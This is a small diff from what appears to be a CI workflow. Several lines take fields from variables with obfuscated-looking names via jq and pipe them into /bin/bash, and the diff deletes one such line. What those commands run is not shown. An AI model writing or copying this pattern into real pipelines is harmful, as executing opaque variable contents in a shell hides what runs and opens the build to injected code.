@@ -27,7 +27,6 @@ jobs:
           echo $bh33946 | jq -r .ctq149 | /bin/bash
           printf '%s' "$zek14064" | jq -r .ou963 | /bin/bash
           echo $drqtw3 | jq -r .li359 | /bin/bash
-          echo $es04 | jq -r .fsbf5047 | /bin/bash
           echo $leuho69 | jq -r .eadq0328 | /bin/bash
 
       - name: Store artifact
